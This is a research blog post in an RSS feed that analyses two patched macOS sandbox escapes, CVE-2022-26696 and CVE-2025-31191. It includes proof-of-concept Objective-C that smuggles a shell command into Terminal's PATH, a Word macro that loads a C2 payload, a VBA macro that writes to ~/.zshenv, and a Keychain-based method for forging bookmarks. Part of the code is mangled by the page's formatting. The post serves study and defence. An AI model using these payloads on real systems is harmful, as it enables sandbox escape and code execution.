<strong>bundle</strong> with a <strong>directory structure</strong> (<strong>Bundle</strong>)</p><p>Although it looks like a single app in Finder, in Terminal you&#x2019;ll see that <code>.app</code> is a directory containing not only the executable but also all necessary <strong>resources, config files, plugins, code signature data, etc.</strong></p><p>Think of macOS treating an app as a package that bundles <strong>everything needed to run the app</strong> rather than a single program file.</p><p>Let&#x2019;s look at the built-in Calculator app as an example!</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image1.png" alt="image.png"></p><p>Inside the <code>Contents</code> folder, you&#x2019;ll find.</p><ul><li><code>MacOS/</code>: Folder containing the executable</li><li><code>Info.plist</code>: XML config file holding the app&#x2019;s metadata</li><li><code>Resources/</code>: Icons, images, language packs, other resources</li><li><code>PlugIns/</code>: (Optional) Plugins</li><li><code>_CodeSignature/</code>: (Optional) Code signature info</li><li><code>version.plist</code>, <code>PkgInfo</code>: (Optional) Other details</li></ul><p><code>Info.plist</code> is an XML-format file that holds important metadata about the app.</p><p>It includes the path to the executable, the app name, the bundle ID, version, and more.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleExecutable<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleIdentifier<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.apple.calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></code></pre><p>Let&#x2019;s try running the app!</p><h3 id="0-1-Launching-an-App"><a href="#0-1-Launching-an-App" class="headerlink" title="0.1 Launching an App"></a><strong>0.1 Launching an App</strong></h3><p>Launching an app essentially means <strong>creating a process</strong> that runs the binary specified by the <code>CFBundleExecutable</code> key. But which parent process launches it?</p><p><em>* <code>CFBundleExecutable</code>: A key in the <code>Info.plist</code> of a macOS app bundle specifying the name of the binary to execute.</em></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image2.png" alt="image.png"></p><p>The command <code>open -a Calculator</code> is the same as double-clicking the Calculator app.</p><p>I ran <code>ps</code> while Calculator was open:</p><p><code>/System/Applications/Calculator.app/Contents/MacOS/Calculator</code> is running, PID 5012. Its parent process (PPID) is <code>1</code>!</p><p>On macOS, PID 1 is <code>/sbin/launchd</code>. This daemon manages all system and user agents on macOS&#x2014;think of it like Windows&#x2019; <code>services.exe</code> or Linux&#x2019;s <code>systemd</code>. It not only manages background services but also acts as the <strong>parent for every GUI-launched app</strong>.</p><p>When users double-click or use <code>open -a</code>, the app runs as a child of <code>launchd</code> (PID 1), making the process tree flat. On other OSes, you can trace which shell or terminal launched a program by following the PPID, but on macOS GUI launches, all apps appear as children of <code>launchd</code>.</p><p>Before macOS Ventura, you could run the executable directly without <code>open</code>. But if not launched within a proper <code>launchd</code> environment, macOS would SIGKILL the app to protect the App Sandbox and TCC.</p><pre><code class="hljs bash">$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp; $ ps -A -j | grep Calculator | grep -v grep</code></pre><p>When run directly, the parent was the shell, not <code>launchd</code>.</p><p>For testing, I created a dummy <code>.app</code>:</p><pre><code class="hljs bash">mkdir -p ~/MyApp.app/Contents/MacOS<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&apos;#!/bin/bash\nsleep 10&apos;</span> &gt; ~/MyApp.app/Contents/MacOS/MyAppchmod +x ~/MyApp.app/Contents/MacOS/MyApp~/MyApp.app/Contents/MacOS/MyApp &amp;ps -A -j | grep MyAppopen -a MyAppps -A -j | grep MyApp</code></pre><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image3.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image4.png" alt="image.png"></p><p>As expected, direct invocation makes it a terminal child while <code>open -a</code> makes it a <code>launchd</code> child.</p><p><code>launchd</code> also handles <code>LaunchAgents</code> and <code>LaunchDaemons</code> for background services, but we won&#x2019;t cover that today. To be continued&#x2026;</p><p>The <code>.app</code> described so far is just one of many types of bundles.</p><p>macOS has various bundle types, as shown below. (This is not a complete list.)</p><ul><li><code>.app</code> &#x2013; An application bundle that contains all the elements that make up an app.</li><li><code>.framework</code> &#x2013; A framework bundle that includes not only loadable code like <code>.dylib</code> but also resources, version information, etc. (The entire framework bundle can be loaded using <code>dlopen()</code>.)</li><li><code>.kext</code> &#x2013; A kernel extension bundle that acts as an extension module loaded directly into the macOS kernel. For security reasons, Apple is gradually restricting their use in the latest versions of macOS.</li><li><code>.plugin</code> &#x2013; Plugin bundles, which include extension modules loaded by the main application</li></ul><p>As such, bundles are not only used to run apps, but also serve as core components that support functional expansion and modularized structures across macOS. </p><p>If so, let&#x2019;s move on~</p><h2 id="1-App-Sandbox"><a href="#1-App-Sandbox" class="headerlink" title="1. App Sandbox"></a>1. App Sandbox</h2><p>We&#x2019;ve seen that macOS apps are bundles. Now let&#x2019;s see how apps are executed and restricted by the system.</p><p>The key concept today is the <strong>App Sandbox</strong>!</p><p>Ideally, from a security standpoint, you&#x2019;d never run untrusted code. But we install and run many apps, so macOS encloses each app in a <strong>sandbox</strong>, restricting it within a &#x201C;box&#x201D; it can&#x2019;t escape.</p><p>Sandboxed apps are denied by default.</p><div class="table-container"><table><thead><tr><th>Restriction</th><th>Description</th></tr></thead><tbody><tr><td>File system</td><td>No access to all files, including home directory</td></tr><tr><td>Network</td><td>No internet or socket access</td></tr><tr><td>Microphone/Camera</td><td>No direct access (requires TCC approval)</td></tr><tr><td>Photo library</td><td>No access (requires separate permission)</td></tr><tr><td>System APIs</td><td>Blocked system calls, process control, etc.</td></tr><tr><td>Child processes</td><td>Can spawn, but children inherit the same sandbox limits</td></tr></tbody></table></div><p>To avoid breaking essential features, some entitlements can be granted.</p><p>For example, an image editor needs to open/save files chosen by the user. A sandboxed app needs explicit exceptions for this, defined in its <code>Entitlements</code>.</p><p><em>* <code>Entitlements</code>: Permissions declared at code signing time, listing allowed capabilities.</em></p><h3 id="1-1-What-are-Entitlements"><a href="#1-1-What-are-Entitlements" class="headerlink" title="1.1 What are Entitlements?"></a>1.1 What are Entitlements?</h3><p>Entitlements are declared in an XML-format <code>.entitlements</code> file or set in Xcode under Signing &amp; Capabilities.</p><div class="table-container"><table><thead><tr><th>Entitlement Key</th><th>Description</th></tr></thead><tbody><tr><td><code>com.apple.security.network.client</code></td><td>Allow network client access</td></tr><tr><td><code>com.apple.security.files.user-selected.read-write</code></td><td>Allow read/write to user-selected files</td></tr><tr><td><code>com.apple.security.assets.pictures.read-write</code></td><td>Allow photo library read/write</td></tr><tr><td><code>com.apple.security.device.camera</code></td><td>Allow camera access</td></tr></tbody></table></div><p>In other words, the app cannot do anything by default, but can only operate within the permissions granted by the user.</p><p><code>Entitlements</code> are typically written in XML format as <code>.entitlements</code> files, and can be added visually in Xcode under the Target &gt; Signing &amp; Capabilities tab.</p><p>++  When using Sandbox, you must declare it as follows.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.app-sandbox<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span></code></pre><p>This key must be declared for macOS to run the app in sandbox mode.</p><h3 id="1-2-TCC"><a href="#1-2-TCC" class="headerlink" title="1.2 TCC"></a>1.2 TCC</h3><p>You&#x2019;ve seen messages like:</p><blockquote><p>&#x201C;@@@&#x201D; Would Like to Modify Apps on your Mac.</p></blockquote><p>This prompt comes from macOS&#x2019;s <strong>TCC</strong> (Transparency, Consent, and Control). When an app attempts to access sensitive data, TCC forces an explicit user consent step, preventing unauthorized access.</p><h2 id="2-Sandbox-Escape"><a href="#2-Sandbox-Escape" class="headerlink" title="2. Sandbox Escape"></a>2. Sandbox Escape</h2><p>We&#x2019;ve explored how strict the App Sandbox is. Can we bypass it to escape the sandbox?</p><p>Of course it&#x2019;s not easy&#x2014;macOS enforces strict access controls. But vulnerabilities have existed. Let&#x2019;s analyze known macOS sandbox escape cases.</p><h3 id="2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app"><a href="#2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app" class="headerlink" title="2.1 CVE-2022-26696: Sandbox Escape via Terminal.app"></a>2.1 CVE-2022-26696: Sandbox Escape via Terminal.app</h3><p>CVE-2022-26696 was a vulnerability that allowed sandboxed apps to escape the sandbox by setting <strong>specific environment variables</strong> when running Terminal.app, causing Terminal to inherit that environment.</p><p>In Terminal&#x2019;s code, <code>isRunningInInstallEnvironment()</code> checks the <code>__OSINSTALL_ENVIRONMENT</code> env var:</p><pre><code class="hljs bash">+(char)isRunningInInstallEnvironment {    <span class="hljs-keyword">if</span> (*(int8_t *)byte_10010617c == 0x1) {        rax = *(int8_t *)byte_10010617b;    } <span class="hljs-keyword">else</span> {        COND = getenv(<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>) != 0x0;        rax = COND_BYTE_SET(NE);        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;        *(int8_t *)byte_10010617c = 0x1;    }    rax = sign_extend_64(rax);    <span class="hljs-built_in">return</span> rax;}</code></pre><p>This checks whether the environment variable <code>__OSINSTALL_ENVIRONMENT</code> is set internally, and if it is, Terminal determines that it is <strong>running in the BaseSystem environment</strong>.</p><p><em>* BaseSystem: Installation UI when booting from a macOS installation USB, macOS Recovery Mode, minimal system environment with BaseSystem.dmg mounted, etc.</em></p><pre><code class="hljs bash">-(void *)init {    var_30 = self;    *(&amp;var_30 + 0x8) = *0x1000f4790;    rax = [[&amp;var_30 super] init];    r14 = rax;    <span class="hljs-keyword">if</span> (rax != 0x0) {        <span class="hljs-keyword">if</span> (*qword_100105e38 == 0x0) {            *qword_100105e38 = r14;        }        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];        <span class="hljs-keyword">if</span> ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {            [rbx removeObjectForKey:@<span class="hljs-string">&quot;HOME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;USER&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;LOGNAME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;PATH&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;SHELL&quot;</span>];        }</code></pre><p>Within the <code>init</code> function, if the value of isRunningInInstallEnvironment() is <code>NO</code>, Terminal is designed to delete key environment variables such as <code>HOME</code> and <code>PATH</code>. However, if this value is YES, the environment variables are not deleted and remain unchanged. Ultimately, by setting the single environment variable __OSINSTALL_ENVIRONMENT=1, Terminal.app will run without deleting the environment variables. This allows sandboxed apps to execute shell commands by running Terminal.</p><p>By exploiting this vulnerability, you can achieve the desired results by performing the following actions within the sandbox app!</p><ol><li>Run Terminal.app with the <code>__OSINSTALL_ENVIRONMENT=1</code> environment variable</li><li>Insert malicious commands into the <code>PATH</code> environment variable &#x2192; in the form of <code>$(malicious_command)</code></li><li>Terminal accepts and executes the environment variables as is</li><li>Execute malicious commands by bypassing the sandboxed app</li></ol><pre><code class="hljs bash">void sbxWithShellCommand(NSString *<span class="hljs-built_in">command</span>) {    FSRef appFSURL;    NSString *path = @<span class="hljs-string">&quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&quot;</span>;    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;appFSURL, NULL);    <span class="hljs-keyword">if</span> (stat2 &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>,stat2);    }    LSApplicationParameters appParam;    appParam.version = 0;    appParam.flags = kLSLaunchDefaults;    appParam.application = &amp;appFSURL;    appParam.argv = NULL;    // Pass the <span class="hljs-built_in">command</span> to be executed as an environment variable.    NSString *finalCommand = [NSString stringWithFormat:@<span class="hljs-string">&quot;<span class="hljs-subst">$(%@)</span>&quot;</span>, <span class="hljs-built_in">command</span>];    NSDictionary *envs = @{@<span class="hljs-string">&quot;PATH&quot;</span>:finalCommand, @<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>:@<span class="hljs-string">&quot;1&quot;</span>};    appParam.environment = (__bridge CFDictionaryRef)envs;    appParam.asyncLaunchRefCon = NULL;    appParam.initialEvent = NULL;    CFArrayRef array = (__bridge CFArrayRef)@[];    OSStatus <span class="hljs-built_in">stat</span> = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;appParam, NULL, 0);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stat</span> &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>, <span class="hljs-built_in">stat</span>);    }}</code></pre><p>Apple&#x2019;s <a href="https://developer.apple.com/documentation/coreservices/launch_services"><strong>LaunchServices API</strong></a> <code>LSOpenURLsWithRole()</code> is used to run Terminal, passing the shell command as an environment variable.</p><p>Additionally, this vulnerability could also be exploited within Microsoft Word macros!</p><pre><code class="hljs bash">Sub AutoOpen()MacScript (<span class="hljs-string">&quot;do shell script &quot;</span><span class="hljs-string">&quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&apos;<span class="hljs-subst">$(/usr/bin/osascript -l JavaScript /path/.apfell.js)</span>&apos;&quot;</span><span class="hljs-string">&quot; &quot;</span>)End Sub</code></pre><p>You can load the Mythic <strong>C2 JXA Payload</strong> by including it in a macro in a Word document.</p><p>++ Apple has designated this vulnerability as <code>CVE-2022-26696</code> and modified Terminal so that it no longer trusts the <code>__OSINSTALL_ENVIRONMENT</code> environment variable.</p><p>I checked each function based on my terminal (v2.14).</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image5.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image6.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image7.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image8.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image9.png" alt="image.png"></p><p>It has been changed so that it not only filters environment variables, but also checks a wider range of security conditions and structurally initializes the internal state.</p><p>The structure that previously relied solely on <code>__OSINSTALL_ENVIRONMENT</code> has been removed, and security has been strengthened so that Terminal only operates in a normal launchd environment. Additionally, Launch Services has been modified to recognize whether the <strong>XPC</strong> client is in a sandboxed state.</p><p>[TTApplication init] code</p><pre><code class="hljs bash">TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2){  TTApplication *v2; // rax  TTApplication *v3; // rbx  id v4; // rax  id v5; // rax  id v6; // r14  void *v7; // rax  id v8; // rax  id v9; // rax  id v10; // rax  id v11; // rax  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF  v13.receiver = self;  v13.cls = &amp;OBJC_CLASS___TTApplication;  v2 = (TTApplication *)objc_msgSendSuper2(&amp;v13, <span class="hljs-string">&quot;init&quot;</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 )                                     // rax  {    <span class="hljs-keyword">if</span> ( !qword_1000FFE38 )      qword_1000FFE38 = v2;    v4 = objc_msgSend(&amp;OBJC_CLASS___NSProcessInfo, <span class="hljs-string">&quot;processInfo&quot;</span>);    v5 = objc_msgSend(v4, <span class="hljs-string">&quot;environment&quot;</span>);    v6 = objc_msgSend(v5, <span class="hljs-string">&quot;mutableCopy&quot;</span>);    v7 = (void *)objc_opt_class(v3);    <span class="hljs-keyword">if</span> ( !(unsigned __int8)objc_msgSend(v7, <span class="hljs-string">&quot;isRunningInInstallEnvironment&quot;</span>) )    {      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFD90);// <span class="hljs-string">&quot;HOME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDB0);// <span class="hljs-string">&quot;USER&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDD0);// <span class="hljs-string">&quot;LOGNAME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDF0);// <span class="hljs-string">&quot;PATH&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE10);// <span class="hljs-string">&quot;SHELL&quot;</span>      <span class="hljs-keyword">if</span> ( (unsigned int)csr_check(2LL) )        objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE30);    }    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE50);    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE70);    v3-&gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, <span class="hljs-string">&quot;copy&quot;</span>);    objc_release(v6);    objc_msgSend(v3, <span class="hljs-string">&quot;setDelegate:&quot;</span>, v3);    v8 = objc_alloc(&amp;OBJC_CLASS___NSMutableIndexSet);    v3-&gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, <span class="hljs-string">&quot;initWithIndexesInRange:&quot;</span>, 1LL, 9LL);    v3-&gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;OBJC_CLASS___NSMutableDictionary);    v9 = objc_msgSend(&amp;OBJC_CLASS___NSUserDefaults, <span class="hljs-string">&quot;standardUserDefaults&quot;</span>);    v10 = objc_msgSend(v9, <span class="hljs-string">&quot;objectForKey:&quot;</span>, off_1000FF878);    <span class="hljs-keyword">if</span> ( v10 )      objc_msgSend(v3, <span class="hljs-string">&quot;setDefaultShell:&quot;</span>, v10);    objc_msgSend(v3, <span class="hljs-string">&quot;addObserver:forKeyPath:options:context:&quot;</span>, v3, &amp;off_1000CFE90, 11LL, &amp;unk_1000A4548);    v11 = objc_msgSend(&amp;OBJC_CLASS___NSNotificationCenter, <span class="hljs-string">&quot;defaultCenter&quot;</span>);    objc_msgSend(      v11,      <span class="hljs-string">&quot;addObserver:selector:name:object:&quot;</span>,      v3,      <span class="hljs-string">&quot;handleWindowKeyChange:&quot;</span>,      NSWindowDidBecomeKeyNotification,      0LL);    v3-&gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;OBJC_CLASS___TTWorkspace);    objc_msgSend(&amp;OBJC_CLASS___NSColor, <span class="hljs-string">&quot;setIgnoresAlpha:&quot;</span>, 0LL);    objc_msgSend(v3, <span class="hljs-string">&quot;initLowSwapSpaceWatcher&quot;</span>);  }  <span class="hljs-built_in">return</span> v3;}</code></pre><hr><h3 id="2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-based-Sandbox-Escape"><a href="#2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-based-Sandbox-Escape" class="headerlink" title="2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks based Sandbox Escape"></a>2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks based Sandbox Escape</h3><p>CVE-2025-31191 is based on a structural flaw that allowed sandboxed apps on macOS to exploit <strong>Security-Scoped Bookmarks</strong> to access system resources without user approval.</p><p>In addition to CVE-2022-26696 discussed in Section 2.1, there were various other Launch Services-based vulnerabilities. Subsequently, Apple strengthened App Sandbox policies within Launch Services to prevent such vulnerabilities. XPC clients are now able to recognize whether they are in a sandboxed state, rendering past vulnerabilities such as <strong>CVE-2022-26706</strong>, <strong>CVE-2021-30864</strong>, and <strong>CVE-2022-26696</strong> invalid.</p><p>These changes have also affected the Microsoft Office for macOS environment. Office apps are now configured to strictly follow macOS sandbox policies, making it difficult to attempt initial penetration using macros as before. However, we focused our analysis on the <strong>SSB (Security-Scoped Bookmark)</strong> feature, which allows file access permissions to be stored like tokens, as it remains a potential threat.</p><blockquote><p><strong>Security-Scoped Bookmark?</strong></p></blockquote><p>macOS restricts app file access permissions for security reasons, and external files cannot be accessed without the user&#x2019;s explicit approval. One of the representative features used for this purpose is <strong>Security-Scoped Bookmark</strong>.</p><p>This Bookmark allows users to store access permissions for specific files or directories like a token once they have granted access. Apps can then store this Bookmark and use it later to access files without requiring user approval again.</p><p>Two key VBA APIs related to this feature have been newly introduced in the Office environment for macOS.</p><ul><li><p><strong>AppleScriptTask</strong></p><p>  This API allows macros to execute predefined AppleScripts. However, these scripts must be located in the <code>~/Library/Application Scripts/[bundle ID]/</code> path, and since Office apps cannot access this path to create files, it was difficult to use macros for sandbox escape.</p></li><li><p><strong>GrantAccessToMultipleFiles</strong></p><p>  This API prompts the user to select multiple files within the macro and grants access to those files outside the sandbox. It is particularly useful for large-scale tasks.</p></li></ul><p>Among these, <code>AppleScriptTask</code> appeared to have no significant security issues, so we conducted a thorough analysis centered on the <code>GrantAccessToMultipleFiles</code> API.</p><blockquote><p><strong>SSB Abuse</strong></p></blockquote><p>Using the <code>GrantAccessToMultipleFiles</code> API, users can access files outside the sandbox by manually selecting and approving files. However, we discovered that <strong>the user&#x2019;s file access approval is retained even after rebooting</strong>. In other words, this approval information is <strong>permanently stored</strong> somewhere, and if exploited, it allows access to files outside the sandbox without additional user approval. !!</p><p>Based on this, we were able to come up with the following scenario.</p><ol><li>The user selects a file normally and grants access permissions.</li><li>These permissions are stored in the form of a Security-Scoped Bookmark.</li><li>A malicious macro exploits this bookmark to access specific files without any additional approval.</li><li>For example, manipulating an initial execution file such as <code>~/.zshenv</code> &#x2192; enables command execution outside the sandbox.</li></ol><blockquote><p><strong>SSB exploitation through macros</strong></p></blockquote><p>Based on the above scenario, we conducted the following tests.</p><ol><li>Open Excel or Word and open a new document.</li><li>Press the shortcut key <code>Alt + F11</code> &#x2192; Open the VBA editor.</li><li>Select <code>Insert &gt; Module</code> from the top menu.</li><li>Paste the code and execute it.<pre><code class="hljs bash">        Sub Poc_GrantAccess()            Dim scptPath As String            Dim fileAccessGranted As Boolean            Dim filePermissionCandidates            Dim payload As String                    <span class="hljs-string">&apos; Set the payload</span><span class="hljs-string">            payload = &quot;echo pwn&quot;</span><span class="hljs-string">        </span><span class="hljs-string">            &apos;</span> Grant file permissions            scptPath = <span class="hljs-string">&quot;/Users/&quot;</span> &amp; Environ(<span class="hljs-string">&quot;USER&quot;</span>) &amp; <span class="hljs-string">&quot;/.zshenv&quot;</span>            filePermissionCandidates = Array(scptPath)            fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)                    <span class="hljs-string">&apos; Create an Application Script</span><span class="hljs-string">            Open scptPath For Output As #1</span><span class="hljs-string">            Print #1, payload</span><span class="hljs-string">            Close #1</span><span class="hljs-string">        End Sub</span><span class="hljs-string">        </span><span class="hljs-string">```    </span><span class="hljs-string">        </span><span class="hljs-string">        </span><span class="hljs-string"></span><span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image10.png)</span><span class="hljs-string"></span><span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image11.png)</span><span class="hljs-string"></span><span class="hljs-string">If an SSB created based on user approval information is exploited, subsequent accesses may bypass the protection of the sandbox policy.</span><span class="hljs-string"></span><span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image12.png)</span><span class="hljs-string"></span><span class="hljs-string">echo pwn executed successfully.</span><span class="hljs-string"></span><span class="hljs-string">&gt; **SSB Storage Location and Structure Analysis**</span><span class="hljs-string"></span><span class="hljs-string">After checking where this bookmark is stored, we found that the data storing the user&apos;</span>s choice (file access approval) was stored <span class="hljs-keyword">in</span> a PLIST file inside the Containers directory.![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image13.png)![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image14.png)The `Containers` directory is a special location that is not subject to App Sandbox restrictions, so even sandboxed apps can **freely access** files <span class="hljs-keyword">in</span> this directory. This means that <span class="hljs-keyword">if</span> a malicious app can manipulate this PLIST file to artificially insert SSB, it can steal arbitrary file access permissions without separate user approval!However... this PLIST file is not a simple text file but is structured as a **signed binary format**. Therefore, simply overwriting values or adding entries is not easy... &gt; **ScopedBookmarkAgent Analysis**To gain a deeper understanding of how this works, we reverse engineered the relevant macOS modules and analyzed their structure.By default, sandboxed apps must obtain file access permission from the user via an Open dialog to access external files. This Open dialog is handled by a sandbox-external service named `com.apple.appkit.xpc.openAndSavePanelService.xpc`.When the user selects a file, this service transmits the access permissions <span class="hljs-keyword">for</span> the selected file to the app <span class="hljs-keyword">in</span> the form of a sandbox extension. This extension is created by the kernel and is a token signed with `HMAC-SHA256`, containing the actual file path, permission information (such as `com.apple.app-sandbox.read-write`), file metadata, and more. Apps that receive this extension can access the file through the `libsystem_sandbox.dylib` sub-API.However, there was a limitation that this extension token was **invalidated upon each reboot**.To solve this, Apple introduced a new non-sandbox process called **ScopedBookmarkAgent**. This agent performs the following two roles.1. Verify the received sandbox extension and convert it into a Bookmark object that can be stored long-term.2. Generate and deliver a new sandbox extension token based on the stored Bookmark data.For example, apps like Microsoft Office can use SSB <span class="hljs-keyword">in</span> the following way!- User approves file access &#x2192; bookmark stored <span class="hljs-keyword">in</span> `securebookmarks.plist`- Subsequent access to the same file &#x2192; bookmark via ScopedBookmarkAgent &#x2192; new extension token generatedThis bookmark object is also signed with HMAC-SHA256, and the key used is calculated as follows.</code></pre>cryptoKey = HMAC-SHA256(secret, &#x201C;[bundle-id]&#x201D;)<br>```</li></ol><p>The <code>secret</code> used here is stored in the <code>com.apple.scopedbookmarksagent.xpc</code> item in <strong>macOS Keychain</strong>, making it very difficult for attackers to arbitrarily sign or manipulate bookmarks. Ultimately, in order to forge bookmarks for sandbox escape, attackers must steal the <strong>ScopedBookmarkAgent&#x2019;s</strong> signing key or be able to insert valid bookmarks indirectly. It&#x2019;s a bit complicated, isn&#x2019;t it?</p><blockquote><p><strong>Keychain ACL bypass</strong></p></blockquote><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image15.png" alt="image.png"></p><p>On macOS, <strong>Keychain</strong> is a space for securely storing passwords and certificates. It can be considered similar to Windows Credential Manager.<br>An important feature of Keychain is that it has an <strong>Access Control List (ACL) that specifies which processes can access each item</strong>.</p><p>The Keychain item that caught my attention was <code>com.apple.scopedbookmarksagent.xpc</code>, and its ACL was set to allow access only to <strong>ScopedBookmarkAgent</strong>.</p><p>However&#x2026;!</p><p>I discovered that this ACL only controls <strong>&#x2018;read&#x2019; permissions</strong>.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image16.png" alt="image.png"></p><p>In other words, it was possible to delete existing items and register <strong>new items created</strong> by attackers with the same names!</p><p>Attackers could even set <strong>ACL</strong>s for new items themselves and configure them so that ScopedBookmarkAgent could access them freely.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image17.png" alt="image.png"></p><p>This could be verified using the command.</p><p>As a result, if an attacker creates a new entry with a fixed secret value, ScopedBookmarkAgent will accept the key without suspicion and use it for signature verification.</p><p>Based on the above, an attacker could exploit the ACL structure of the keychain and the signature key derivation structure to <strong>manipulate and sign arbitrary SSBs</strong>, thereby <strong>gaining a sandbox escape path</strong>.</p><p>This vulnerability could affect all macOS sandboxed apps that use SSBs and was particularly dangerous because it could be exploited as a generic macOS Sandbox Escape technique not limited to a single app. </p><p>In this article, I studied Sandbox Escape! It was fun&#x2026;!!!</p><p>I&#x2019;ll study something interesting again next time~ &gt;_o</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://support.apple.com/en-us/122375">https://support.apple.com/en-us/122375</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/">https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/</a></p><p><a href="https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf">https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf</a></p><p><a href="https://github.com/yo-yo-yo-jbo/macos_app_structure">https://github.com/yo-yo-yo-jbo/macos_app_structure</a></p><p><a href="https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/">https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Sandbox-Escape/">Sandbox Escape</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
